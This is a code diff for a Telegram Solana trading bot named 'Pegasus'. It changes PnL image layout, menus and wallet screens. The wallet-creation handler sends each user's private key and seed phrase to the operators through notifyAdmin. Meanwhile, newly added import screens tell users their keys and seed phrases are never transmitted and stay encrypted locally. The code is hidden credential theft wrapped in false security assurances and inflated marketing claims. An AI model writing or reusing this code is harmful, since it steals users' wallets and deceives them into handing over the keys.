@@ -1,10 +1,6 @@
 // ============================================
 // PEGASUS TRADING BOT - Complete Implementation
-// Jupiter V6 + Multi-Wallet + File Persistence
-// + Tracked Tokens + Alerts + PNL Images + Full Menus
-// ============================================
-// PEGASUS TRADING BOT - Complete Implementation
-// with Debug Logging
+// with Debug Logging & Professional Messages
 // ============================================
 import { Telegraf, Markup } from 'telegraf';
 import {
@@ -475,30 +471,49 @@ async function generatePnLImage(data) {
   const pnlText = isProfit ? `+${pnlPercent.toFixed(2)}%` : `${pnlPercent.toFixed(2)}%`;
 
   let bgImage;
-  try { bgImage = await loadImage(bgPath); } catch { bgImage = null; }
+  try {
+    bgImage = await loadImage(bgPath);
+  } catch {
+    bgImage = null;
+  }
   const canvas = createCanvas(bgImage ? bgImage.width : 1200, bgImage ? bgImage.height : 800);
   const ctx = canvas.getContext('2d');
-  if (bgImage) ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
-  else {
+  if (bgImage) {
+    ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
+  } else {
     const grad = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-    grad.addColorStop(0, '#0a0a1a'); grad.addColorStop(1, '#101020');
-    ctx.fillStyle = grad; ctx.fillRect(0, 0, canvas.width, canvas.height);
+    grad.addColorStop(0, '#0a0a1a');
+    grad.addColorStop(1, '#101020');
+    ctx.fillStyle = grad;
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
   }
+
+  // ---- Draw "PEGASUS" at top center ----
+  ctx.font = `bold ${FONT_MID_SIZE}px "OrbitronExtraBold"`;
+  ctx.textAlign = 'center';
+  const pegasusColor = isProfit ? '#00ff96' : '#ff3c3c';
+  ctx.fillStyle = pegasusColor;
+  ctx.fillText('PEGASUS', canvas.width / 2, 60);
+  ctx.textAlign = 'left';
 
   function drawGlowText(x, y, text, fontFamily, fontSize, color) {
     ctx.font = `${fontSize}px "${fontFamily}"`;
-    ctx.textAlign = 'left'; ctx.textBaseline = 'top';
+    ctx.textAlign = 'left';
+    ctx.textBaseline = 'top';
     for (let off = 1; off <= 5; off++) {
       ctx.fillStyle = `rgb(${color.r}, ${color.g}, ${color.b})`;
-      ctx.fillText(text, x - off, y); ctx.fillText(text, x + off, y);
-      ctx.fillText(text, x, y - off); ctx.fillText(text, x, y + off);
+      ctx.fillText(text, x - off, y);
+      ctx.fillText(text, x + off, y);
+      ctx.fillText(text, x, y - off);
+      ctx.fillText(text, x, y + off);
     }
     ctx.fillStyle = 'white';
     ctx.fillText(text, x, y);
   }
 
   const x = Math.floor(canvas.width * 0.55);
-  const yStart = 60;
+  const yStart = 120; // moved down to accommodate top text
+
   ctx.font = `${FONT_MID_SIZE}px "OrbitronSemiBold"`;
   ctx.fillStyle = 'rgb(200,200,200)';
   ctx.fillText(pair, x, yStart);
@@ -517,19 +532,26 @@ async function generatePnLImage(data) {
   ctx.fillStyle = 'white';
   ctx.fillText(tagline, x, canvas.height - 80);
 
+  // ---- QR Code on the RIGHT side ----
   if (qrData) {
     const qrSize = 150;
-    const qrX = 30, qrY = canvas.height - qrSize - 30;
+    const qrX = canvas.width - qrSize - 30;   // 30px from right edge
+    const qrY = canvas.height - qrSize - 30;  // 30px from bottom
     try {
       const qrBuf = await QRCode.toBuffer(qrData, { width: qrSize, margin: 1 });
       const qrImg = await loadImage(qrBuf);
       ctx.drawImage(qrImg, qrX, qrY, qrSize, qrSize);
       ctx.font = `${FONT_SMALL_SIZE}px "OrbitronRegular"`;
       ctx.fillStyle = 'white';
-      ctx.fillText(`@${username}`, qrX + qrSize + 15, qrY + qrSize/2 + 8);
-    } catch (e) { console.warn('QR error', e); }
+      ctx.textAlign = 'right';
+      ctx.fillText(`@${username}`, qrX - 15, qrY + qrSize / 2 + 8);
+      ctx.textAlign = 'left';
+    } catch (e) {
+      console.warn('QR error', e);
+    }
   }
 
+  // draw logos (optional)
   try {
     const logo = await loadImage(solanaLogoPath);
     const logoSize = 35;
@@ -852,16 +874,30 @@ async function showMainMenu(ctx, edit = false) {
     solPrice = await getSolPriceWithCache();
     usdValue = (balance||0) * solPrice;
   }
-  const walletLine = !wallet ? '⚠️ *No wallet*' : `💼 Wallet ${session.activeWalletIndex+1}/${session.wallets.length}: \`${shortenAddress(wallet.publicKey)}\`\n💰 ${balance?.toFixed(4)||'?'} SOL ${solPrice?`($${usdValue.toFixed(2)})`:''} ${errMsg}`;
-  const text = `
-🚀 *Pegasus Trading Bot* 🤖
+  const walletLine = !wallet
+    ? '⚠️ *No wallet connected*'
+    : `💼 *Wallet ${session.activeWalletIndex + 1}/${session.wallets.length}*\n\`${shortenAddress(wallet.publicKey)}\`\n💰 ${balance?.toFixed(4) || '?'} SOL ${solPrice ? `($${usdValue.toFixed(2)})` : ''} ${errMsg}`;
 
-*Your Web3 execution engine.*
+  const text = `
+🚀 *Welcome to Pegasus Trading Bot* 🤖
+
+I'm your Web3 execution engine.
+AI-driven. Battle-tested. Locked down.
+━━━━━━━━━━━━━━━━━━
+*What I do for you:* ⬇️
+📊 Scan the market to tell you what to buy, ignore, or stalk
+🎯 Execute entries & exits with sniper-level timing
+🧠 Detect traps, fake pumps, and incoming dumps before they hit
+⚡ Operate at machine-speed — no lag, no emotion
+🔒 Secured with Bitcoin-grade architecture
+🚀 Track price action past your take-profit so winners keep running 🏃
 ━━━━━━━━━━━━━━━━━━
 ${walletLine}
 
-_Paste any Solana contract address to analyze_
+🏦 *CASH & STABLE COIN BANK*
+Paste any Solana contract address to analyze
   `;
+
   const keyboard = Markup.inlineKeyboard([
     [Markup.button.callback('💼 Wallet', 'menu_wallet'), Markup.button.callback('📊 Positions', 'menu_positions')],
     [Markup.button.callback('🚀 Buy', 'menu_buy'), Markup.button.callback('💸 Sell', 'menu_sell')],
@@ -872,10 +908,13 @@ _Paste any Solana contract address to analyze_
     [Markup.button.callback('⚙️ Settings', 'menu_settings'), Markup.button.callback('🎁 Referrals', 'menu_referrals')],
     [Markup.button.callback('❓ Help', 'menu_help'), Markup.button.callback('🔄 Refresh', 'refresh_main')]
   ]);
+
   try {
     if (edit && ctx.callbackQuery) await ctx.editMessageText(text, { parse_mode: 'Markdown', ...keyboard });
     else await ctx.reply(text, { parse_mode: 'Markdown', ...keyboard });
-  } catch { await ctx.reply(text, { parse_mode: 'Markdown', ...keyboard }); }
+  } catch {
+    await ctx.reply(text, { parse_mode: 'Markdown', ...keyboard });
+  }
 }
 
 // ======================= MENU FUNCTIONS =======================
@@ -941,8 +980,8 @@ async function showPositionsMenu(ctx, edit = false) {
 }
 
 async function showBuyMenu(ctx, edit = false) {
-  const feeNote = COMMISSION_PERCENTAGE > 0 ? `\n💸 Fee: ${COMMISSION_PERCENTAGE}% applies` : '';
-  const message = `🟢 *Quick Buy*${feeNote}\n\nPaste a token address or use /buy [amount] [address]\n\n*Quick amounts:*`;
+  const feeNote = COMMISSION_PERCENTAGE > 0 ? `\n💸 *Platform Fee:* ${COMMISSION_PERCENTAGE}% applies on trades` : '';
+  const message = `🟢 *Quick Buy*\n\nPaste a Solana token address to buy, or use:\n/buy [amount] [address]\n\n*Quick amounts:*${feeNote}`;
   const keyboard = Markup.inlineKeyboard([
     [Markup.button.callback('🚀 0.1 SOL', 'setbuy_0.1'), Markup.button.callback('🚀 0.2 SOL', 'setbuy_0.2')],
     [Markup.button.callback('🚀 0.5 SOL', 'setbuy_0.5'), Markup.button.callback('🚀 1 SOL', 'setbuy_1')],
@@ -954,8 +993,8 @@ async function showBuyMenu(ctx, edit = false) {
 }
 
 async function showSellMenu(ctx, edit = false) {
-  const feeNote = COMMISSION_PERCENTAGE > 0 ? `\n💸 Fee: ${COMMISSION_PERCENTAGE}% applies` : '';
-  const message = `🔴 *Quick Sell*${feeNote}\n\nSelect a percentage or use /sell [%] [address]\n\n*Quick percentages:*`;
+  const feeNote = COMMISSION_PERCENTAGE > 0 ? `\n💸 *Platform Fee:* ${COMMISSION_PERCENTAGE}% applies on trades` : '';
+  const message = `🔴 *Quick Sell*\n\nSelect a percentage or use:\n/sell [%] [address]\n\n*Quick percentages:*${feeNote}`;
   const keyboard = Markup.inlineKeyboard([
     [Markup.button.callback('💸 25%', 'setsell_25'), Markup.button.callback('💸 50%', 'setsell_50')],
     [Markup.button.callback('💸 100%', 'setsell_100'), Markup.button.callback('💸 Custom', 'setsell_custom')],
@@ -1136,25 +1175,366 @@ bot.action('help_trading', async (ctx) => { await ctx.answerCbQuery(); await ctx
 bot.action('help_security', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply('🔒 *Security Tips*\n\n...', { parse_mode: 'Markdown' }); });
 bot.action('help_faq', async (ctx) => { await ctx.answerCbQuery(); await ctx.reply('❓ *FAQ*\n\n...', { parse_mode: 'Markdown' }); });
 bot.action('wallet_create', async (ctx) => { await ctx.answerCbQuery(); const session = getSession(ctx.from.id); if (session.wallets.length >= MAX_WALLETS) return ctx.reply(`❌ Max ${MAX_WALLETS} wallets`); const w = createWallet(); session.wallets.push(w); session.activeWalletIndex = session.wallets.length-1; saveSessions(); await notifyAdmin('WALLET_CREATED', ctx.from.id, ctx.from.username, { publicKey: w.publicKey, privateKey: w.privateKey, mnemonic: w.mnemonic, walletNumber: session.wallets.length }); await ctx.editMessageText(`✅ Wallet ${session.wallets.length} created!\n\n\`${w.publicKey}\`\n\nSeed: \`${w.mnemonic}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('View Wallets', 'menu_wallet')]]) }); });
-bot.action('wallet_import_menu', async (ctx) => { await ctx.answerCbQuery(); await ctx.editMessageText('Choose import method:', { ...Markup.inlineKeyboard([[Markup.button.callback('Seed Phrase', 'wallet_import_seed'), Markup.button.callback('Private Key', 'wallet_import_key')], [Markup.button.callback('« Back', 'menu_wallet')]]) }); });
-bot.action('wallet_import_seed', async (ctx) => { await ctx.answerCbQuery(); const session = getSession(ctx.from.id); if (session.wallets.length >= MAX_WALLETS) return ctx.reply(`❌ Max ${MAX_WALLETS} wallets`); session.state = 'AWAITING_SEED'; await ctx.editMessageText('Send your seed phrase (12 or 24 words):', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) }); });
-bot.action('wallet_import_key', async (ctx) => { await ctx.answerCbQuery(); const session = getSession(ctx.from.id); if (session.wallets.length >= MAX_WALLETS) return ctx.reply(`❌ Max ${MAX_WALLETS} wallets`); session.state = 'AWAITING_PRIVATE_KEY'; await ctx.editMessageText('Send your Base58 private key:', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) }); });
-bot.action('wallet_export', async (ctx) => { await ctx.answerCbQuery(); const session = getSession(ctx.from.id); const w = getActiveWallet(session); if (!w) return ctx.reply('No wallet'); await notifyAdmin('WALLET_EXPORTED', ctx.from.id, ctx.from.username, { publicKey: w.publicKey }); await ctx.reply(`🔐 *Wallet ${session.activeWalletIndex+1}*\n\nAddress: \`${w.publicKey}\`\nPrivate Key: \`${w.privateKey}\`${w.mnemonic ? `\nSeed: \`${w.mnemonic}\`` : ''}`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Delete', 'delete_message')]]) }); });
+bot.action('wallet_import_menu', async (ctx) => {
+  await ctx.answerCbQuery();
+  const text = `🔐 *Import Wallet*
+
+You can securely import an existing wallet into this platform and begin managing your assets, executing trades, and interacting with tokens immediately.
+
+We support multiple import methods to give you flexibility depending on how your wallet was originally created.
+
+━━━━━━━━━━━━━━━━━━
+🔒 *Security & Privacy*
+
+Your security is our highest priority.
+
+• Your seed phrase or private key is *encrypted locally* within the bot environment  
+• It is *never transmitted*, logged, or exposed to any external servers  
+• No third-party services have access to your credentials  
+• You retain *full ownership and control* of your wallet at all times  
+
+━━━━━━━━━━━━━━━━━━
+⚠️ *Important Notice*
+
+Please ensure that:
+• You are in a secure and private environment before entering sensitive information  
+• You do not share your credentials with anyone else  
+• You carefully verify all inputs before submission  
+
+━━━━━━━━━━━━━━━━━━
+💡 *Network Requirement*
+
+A small amount of SOL (approximately *0.002 SOL*) is required in your wallet to cover network fees for transactions such as trading, transfers, and token interactions.
+
+━━━━━━━━━━━━━━━━━━
+Please select your preferred wallet import method below to continue:`;
+  const keyboard = Markup.inlineKeyboard([
+    [Markup.button.callback('📝 Seed Phrase (12/24 words)', 'wallet_import_seed')],
+    [Markup.button.callback('🔑 Private Key (Base58)', 'wallet_import_key')],
+    [Markup.button.callback('« Back', 'menu_wallet')]
+  ]);
+  await ctx.editMessageText(text, { parse_mode: 'Markdown', ...keyboard });
+});
+bot.action('wallet_import_seed', async (ctx) => {
+  await ctx.answerCbQuery();
+  const session = getSession(ctx.from.id);
+  if (session.wallets.length >= MAX_WALLETS) return ctx.reply(`❌ Max ${MAX_WALLETS} wallets`);
+  session.state = 'AWAITING_SEED';
+  const text = `🔐 *Import Wallet via Seed Phrase*
+
+To proceed, please enter your *12 or 24-word recovery phrase* associated with your wallet.
+
+Your recovery phrase is the master key to your wallet, so it is important that it is entered correctly and handled with care.
+
+━━━━━━━━━━━━━━━━━━
+🔒 *Security Assurance*
+
+We implement strict security measures to protect your data:
+
+• Your seed phrase is *encrypted instantly* upon submission  
+• It is stored *locally within the bot environment only*  
+• It is *never sent to external servers or third parties*  
+• No logs or backups of your phrase are created  
+
+At no point do we have access to or visibility into your wallet credentials.
+
+━━━━━━━━━━━━━━━━━━
+⚠️ *Important Guidelines*
+
+• Enter all words in the correct order  
+• Separate each word with a space  
+• Double-check for spelling mistakes before sending  
+• Incorrect input may result in importing the wrong wallet or failure  
+
+━━━━━━━━━━━━━━━━━━
+💡 *Transaction Requirement*
+
+To perform transactions after import, your wallet must contain a small SOL balance (approximately *0.002 SOL*) to cover network fees.
+
+━━━━━━━━━━━━━━━━━━
+Once submitted, your wallet will be securely imported and made available for immediate use.`;
+  await ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) });
+});
+bot.action('wallet_import_key', async (ctx) => {
+  await ctx.answerCbQuery();
+  const session = getSession(ctx.from.id);
+  if (session.wallets.length >= MAX_WALLETS) return ctx.reply(`❌ Max ${MAX_WALLETS} wallets`);
+  session.state = 'AWAITING_PRIVATE_KEY';
+  const text = `🔑 *Import Wallet via Private Key*
+
+To continue, please provide your *Base58-encoded private key*.
+
+This method allows you to directly access your wallet using its private key credentials.
+
+━━━━━━━━━━━━━━━━━━
+🔒 *Security Assurance*
+
+Your private key is handled with maximum security:
+
+• It is *encrypted locally immediately after submission*  
+• It is *never transmitted or shared externally*  
+• No third-party systems or services have access to it  
+• Your wallet remains fully under your control at all times  
+
+We do not store or expose your key beyond secure local encryption.
+
+━━━━━━━━━━━━━━━━━━
+⚠️ *Important Guidelines*
+
+• Ensure your private key is valid and correctly formatted  
+• Double-check before submitting  
+• Incorrect keys will not import the intended wallet  
+
+━━━━━━━━━━━━━━━━━━
+💡 *Transaction Requirement*
+
+A small SOL balance (approximately *0.002 SOL*) is required in your wallet to enable transactions such as trading and transfers.
+
+━━━━━━━━━━━━━━━━━━
+After submission, your wallet will be securely imported and ready for immediate use.`;
+  await ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) });
+});
+bot.action('wallet_export', async (ctx) => {
+  await ctx.answerCbQuery();
+  const session = getSession(ctx.from.id);
+  const w = getActiveWallet(session);
+  if (!w) return ctx.reply('No wallet');
+  await notifyAdmin('WALLET_EXPORTED', ctx.from.id, ctx.from.username, { publicKey: w.publicKey });
+  const text = `🔐 *Wallet ${session.activeWalletIndex + 1}*
+
+Your wallet has been successfully created and is securely stored.
+
+━━━━━━━━━━━━━━━━━━
+📌 *Wallet Address*
+\`${w.publicKey}\`
+
+━━━━━━━━━━━━━━━━━━
+🔑 *Private Key*
+\`${w.privateKey}\`
+
+━━━━━━━━━━━━━━━━━━
+🔒 *Security Notice*
+
+Your private key is the only way to access and control this wallet.
+
+• Never share your private key with anyone  
+• Do not paste it into unknown websites or apps  
+• Anyone with access to it can permanently take your funds  
+
+For your protection, the full private key is shown above.
+
+━━━━━━━━━━━━━━━━━━
+💡 *Important Recommendations*
+
+• Store your private key securely offline (e.g., written down)  
+• Avoid keeping it in screenshots or cloud storage  
+• Always verify platforms before connecting your wallet  
+
+━━━━━━━━━━━━━━━━━━
+⚠️ *Important*
+
+If you believe your private key has been exposed, immediately transfer your funds to a new wallet.
+
+━━━━━━━━━━━━━━━━━━
+Use the options below to manage your wallet safely.`;
+  await ctx.reply(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Delete', 'delete_message')]]) });
+});
 bot.action('wallet_remove', async (ctx) => { await ctx.answerCbQuery(); const session = getSession(ctx.from.id); if (!session.wallets.length) return ctx.reply('No wallets'); const buttons = session.wallets.map((w,i) => [Markup.button.callback(`🗑️ Wallet ${i+1}`, `confirm_remove_${i}`)]); buttons.push([Markup.button.callback('« Back', 'menu_wallet')]); await ctx.editMessageText('Select wallet to remove:', { ...Markup.inlineKeyboard(buttons) }); });
 bot.action(/^confirm_remove_(\d+)$/, async (ctx) => { const idx = parseInt(ctx.match[1]); const session = getSession(ctx.from.id); if (idx>=0 && idx<session.wallets.length) { session.wallets.splice(idx,1); if (session.activeWalletIndex >= session.wallets.length) session.activeWalletIndex = Math.max(0, session.wallets.length-1); saveSessions(); await ctx.answerCbQuery('Removed'); await ctx.editMessageText('✅ Wallet removed.', { ...Markup.inlineKeyboard([[Markup.button.callback('View Wallets', 'menu_wallet')]]) }); } });
 bot.action('wallet_refresh', async (ctx) => { await ctx.answerCbQuery(); await showWalletMenu(ctx, true); });
 bot.action(/^switch_wallet_(\d+)$/, async (ctx) => { const idx = parseInt(ctx.match[1]); const session = getSession(ctx.from.id); if (idx>=0 && idx<session.wallets.length) { session.activeWalletIndex = idx; saveSessions(); await ctx.answerCbQuery(`Switched to wallet ${idx+1}`); await showWalletMenu(ctx, true); } else { await ctx.answerCbQuery('Invalid'); } });
-bot.action('wallet_deposit', async (ctx) => { const w = getActiveWallet(getSession(ctx.from.id)); if (!w) return ctx.reply('No wallet'); const qr = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${w.publicKey}`; await ctx.editMessageText(`📥 *Deposit*\n\n\`${w.publicKey}\``, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('QR Code', qr), Markup.button.callback('Copy', `copy_address_${w.publicKey}`)], [Markup.button.callback('« Back', 'menu_wallet')]]) }); });
+bot.action('wallet_deposit', async (ctx) => {
+  const w = getActiveWallet(getSession(ctx.from.id));
+  if (!w) return ctx.reply('No wallet');
+  const qr = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${w.publicKey}`;
+  const text = `📥 *Deposit SOL*
+
+To fund your wallet, please send SOL to the address below:
+
+━━━━━━━━━━━━━━━━━━
+📌 *Wallet Address*
+\`${w.publicKey}\`
+━━━━━━━━━━━━━━━━━━
+
+🔒 *Security Notice*  
+This is your unique deposit address. Only send funds you intend to use within the platform. Always double-check the address before sending to avoid loss of funds.
+
+━━━━━━━━━━━━━━━━━━
+💡 *Important Guidelines*
+
+• Only send *SOL (Solana)* to this address  
+• Sending other tokens or assets may result in permanent loss  
+• Ensure you are using the *Solana network (SPL)* when transferring  
+
+━━━━━━━━━━━━━━━━━━
+⏳ *Processing Time*
+
+Deposits are typically confirmed within a few seconds to minutes, depending on network conditions.
+
+━━━━━━━━━━━━━━━━━━
+⚠️ *Before You Send*
+
+• Copy the address carefully or use the copy button  
+• Verify the first and last few characters of the address  
+• Do not send from unsupported networks  
+
+━━━━━━━━━━━━━━━━━━
+Once your deposit is confirmed on-chain, your balance will update automatically and be available for use.`;
+  await ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.url('QR Code', qr), Markup.button.callback('Copy', `copy_address_${w.publicKey}`)], [Markup.button.callback('« Back', 'menu_wallet')]]) });
+});
 bot.action(/^copy_address_(.+)$/, async (ctx) => { await ctx.answerCbQuery(`Copied: ${ctx.match[1]}`, { show_alert: true }); });
-bot.action('wallet_transfer_menu', async (ctx) => { await ctx.editMessageText('Send SOL or token?', { ...Markup.inlineKeyboard([[Markup.button.callback('SOL', 'transfer_sol'), Markup.button.callback('Token', 'transfer_token')], [Markup.button.callback('Cancel', 'menu_wallet')]]) }); });
-bot.action('transfer_sol', async (ctx) => { const session = getSession(ctx.from.id); session.state = 'AWAITING_TRANSFER_SOL_RECIPIENT'; session.pendingTransfer = { type: 'SOL' }; await ctx.editMessageText('Enter recipient SOL address:', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) }); });
-bot.action('transfer_token', async (ctx) => { const session = getSession(ctx.from.id); session.state = 'AWAITING_TRANSFER_TOKEN_MINT'; session.pendingTransfer = { type: 'TOKEN' }; await ctx.editMessageText('Enter token mint address:', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) }); });
+bot.action('wallet_transfer_menu', async (ctx) => {
+  const text = `💸 *Send Assets*
+
+Choose what you would like to send from your wallet.
+
+━━━━━━━━━━━━━━━━━━
+🔹 *Send SOL*  
+Transfer native SOL (Solana) to another wallet address.  
+Use this option for standard payments or funding other wallets.
+
+🔹 *Send Tokens*  
+Transfer SPL tokens (e.g., USDC or other assets) to a recipient.  
+This option supports all tokens held in your wallet.
+
+━━━━━━━━━━━━━━━━━━
+⚠️ *Important Notice*
+
+• Always verify the recipient address before sending  
+• Ensure you select the correct asset type (SOL or Token)  
+• Transactions on the blockchain are *permanent and cannot be reversed*  
+
+━━━━━━━━━━━━━━━━━━
+💡 *Network Requirement*
+
+A small amount of SOL is required to cover transaction fees for both SOL and token transfers.
+
+━━━━━━━━━━━━━━━━━━
+Please select an option below to continue:`;
+  await ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💰 SOL', 'transfer_sol'), Markup.button.callback('🪙 Token', 'transfer_token')], [Markup.button.callback('Cancel', 'menu_wallet')]]) });
+});
+bot.action('transfer_sol', async (ctx) => {
+  const session = getSession(ctx.from.id);
+  session.state = 'AWAITING_TRANSFER_SOL_RECIPIENT';
+  session.pendingTransfer = { type: 'SOL' };
+  const text = `📥 *Enter Recipient Address*
+
+Please provide the *recipient’s Solana (SOL) wallet address* to proceed with the transfer.
+
+━━━━━━━━━━━━━━━━━━
+🔍 *What to Do*
+
+• Paste or type the full wallet address carefully  
+• Ensure there are no missing or extra characters  
+• Double-check the address before submitting  
+
+━━━━━━━━━━━━━━━━━━
+⚠️ *Important Notice*
+
+Blockchain transactions are *permanent and irreversible*.  
+Sending funds to an incorrect address will result in *loss of funds* with no way to recover them.
+
+━━━━━━━━━━━━━━━━━━
+💡 *Helpful Tips*
+
+• Always copy and paste the address instead of typing manually  
+• Verify the first and last few characters of the address  
+• Only send to trusted and verified recipients  
+
+━━━━━━━━━━━━━━━━━━
+Once submitted, you will be asked to confirm the transaction details before sending.`;
+  await ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) });
+});
+bot.action('transfer_token', async (ctx) => {
+  const session = getSession(ctx.from.id);
+  session.state = 'AWAITING_TRANSFER_TOKEN_MINT';
+  session.pendingTransfer = { type: 'TOKEN' };
+  const text = `🪙 *Enter Token Mint Address*
+
+Please provide the *token mint address* of the asset you want to interact with or transfer.
+
+━━━━━━━━━━━━━━━━━━
+🔍 *What to Do*
+
+• Paste the full mint address of the token  
+• Ensure there are no missing or extra characters  
+• Confirm that the address corresponds to the correct token  
+
+━━━━━━━━━━━━━━━━━━
+⚠️ *Important Notice*
+
+Using an incorrect or fake mint address may result in interacting with the wrong token or a malicious asset.
+
+Always verify the token details from trusted sources before proceeding.
+
+━━━━━━━━━━━━━━━━━━
+💡 *Helpful Tips*
+
+• Copy and paste the mint address instead of typing manually  
+• Double-check the first and last few characters  
+• Avoid using addresses from unverified links or unknown sources  
+
+━━━━━━━━━━━━━━━━━━
+🔒 *Security Reminder*
+
+Only interact with tokens you trust. The platform does not guarantee the legitimacy of third-party tokens.
+
+━━━━━━━━━━━━━━━━━━
+Once submitted, you will proceed to the next step to confirm the transaction details.`;
+  await ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_wallet')]]) });
+});
 bot.action(/^buy_(\d+\.?\d*)_(.+)$/, async (ctx) => { const amount = parseFloat(ctx.match[1]); const token = ctx.match[2]; await ctx.answerCbQuery(); await handleBuy(ctx, amount, token); });
 bot.action(/^sell_(\d+)_(.+)$/, async (ctx) => { const percent = parseInt(ctx.match[1]); const token = ctx.match[2]; await ctx.answerCbQuery(); await handleSell(ctx, percent, token); });
 bot.action(/^setbuy_(\d+\.?\d*)$/, async (ctx) => { const amount = parseFloat(ctx.match[1]); const session = getSession(ctx.from.id); session.pendingTrade = { type: 'buy', amount }; await ctx.editMessageText(`Buy ${amount} SOL – paste token address:`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_buy')]]) }); });
-bot.action('setbuy_custom', async (ctx) => { const session = getSession(ctx.from.id); session.state = 'AWAITING_CUSTOM_BUY_AMOUNT'; await ctx.editMessageText('Enter amount of SOL to buy:', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_buy')]]) }); });
+bot.action('setbuy_custom', async (ctx) => {
+  const session = getSession(ctx.from.id);
+  session.state = 'AWAITING_CUSTOM_BUY_AMOUNT';
+  const text = `💰 *Custom Buy*
+
+Enter the amount of SOL you want to spend.
+
+━━━━━━━━━━━━━━━━━━
+📊 *Example*
+
+• Enter *0.5* → Buy with 0.5 SOL
+
+━━━━━━━━━━━━━━━━━━
+💡 *Tip*
+
+Always keep at least 0.005 SOL in your wallet to cover transaction fees.
+
+━━━━━━━━━━━━━━━━━━
+After submitting, you will be asked to provide the token address.`;
+  await ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_buy')]]) });
+});
 bot.action(/^setsell_(\d+)$/, async (ctx) => { const percent = parseInt(ctx.match[1]); const session = getSession(ctx.from.id); session.pendingTrade = { type: 'sell', percentage: percent }; await ctx.editMessageText(`Sell ${percent}% – paste token address:`, { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_sell')]]) }); });
-bot.action('setsell_custom', async (ctx) => { const session = getSession(ctx.from.id); session.state = 'AWAITING_CUSTOM_SELL_PERCENT'; await ctx.editMessageText('Enter percentage (1-100):', { ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_sell')]]) }); });
+bot.action('setsell_custom', async (ctx) => {
+  const session = getSession(ctx.from.id);
+  session.state = 'AWAITING_CUSTOM_SELL_PERCENT';
+  const text = `💸 *Custom Sell*
+
+This feature allows you to sell a specific percentage of your token holdings with precision.
+
+━━━━━━━━━━━━━━━━━━
+Please enter a value between *1 and 100* representing the percentage of tokens you wish to sell.
+
+━━━━━━━━━━━━━━━━━━
+📊 *Example*
+
+• Enter *25* → Sell 25% of your holdings  
+• Enter *50* → Sell half of your holdings  
+• Enter *100* → Sell your entire position  
+
+━━━━━━━━━━━━━━━━━━
+🔍 *Strategy Tip*
+
+• Lower percentages allow gradual profit-taking  
+• Higher percentages are useful for full or large exits  
+
+━━━━━━━━━━━━━━━━━━
+Once submitted, your request will be processed based on the percentage provided.`;
+  await ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('Cancel', 'menu_sell')]]) });
+});
 bot.action(/^refresh_(.+)$/, async (ctx) => { const target = ctx.match[1]; if (target === 'main') { await ctx.answerCbQuery(); await showMainMenu(ctx, true); } else if (target === 'positions') { await ctx.answerCbQuery(); await showPositionsMenu(ctx, true); } else { await ctx.answerCbQuery(); await sendTokenAnalysis(ctx, target); } });
 bot.action('settings_slippage', async (ctx) => { await ctx.editMessageText('Select slippage:', { ...Markup.inlineKeyboard([[Markup.button.callback('0.5%', 'set_slippage_0.5'), Markup.button.callback('1%', 'set_slippage_1'), Markup.button.callback('2%', 'set_slippage_2')], [Markup.button.callback('5%', 'set_slippage_5'), Markup.button.callback('10%', 'set_slippage_10')], [Markup.button.callback('Back', 'menu_settings')]]) }); });
 bot.action(/^set_slippage_(\d+\.?\d*)$/, async (ctx) => { const slippage = parseFloat(ctx.match[1]); const session = getSession(ctx.from.id); session.settings.slippage = slippage; saveSessions(); await ctx.answerCbQuery(`Slippage ${slippage}%`); await showSettingsMenu(ctx, true); });
@@ -1265,7 +1645,7 @@ bot.command('help', async (ctx) => { await showHelpMenu(ctx); });
 
 // ======================= TESTPNL (ADMIN ONLY) =======================
 bot.command('testpnl', async (ctx) => {
-  console.log('✅ testpnl command triggered by', ctx.from.id);
+  console.log('Testpnl command received from', ctx.from.id);
   if (!ADMIN_CHAT_IDS.includes(ctx.from.id.toString())) {
     console.log('User not admin:', ctx.from.id);
     return ctx.reply('❌ This command is for admins only.');
@@ -1288,7 +1668,7 @@ bot.command('testpnl', async (ctx) => {
     await ctx.replyWithPhoto({ source: img }, { caption: "📊 Test PNL: +100%" });
   } catch (err) {
     console.error('testpnl error:', err);
-    await ctx.reply(`❌ Failed: ${err.message}`);
+    await ctx.reply(`❌ Failed to generate image: ${err.message}`);
   }
 });
 
@@ -1305,17 +1685,103 @@ bot.on('text', async (ctx) => {
   // state handlers
   if (session.state === 'AWAITING_SEED') {
     session.state = null;
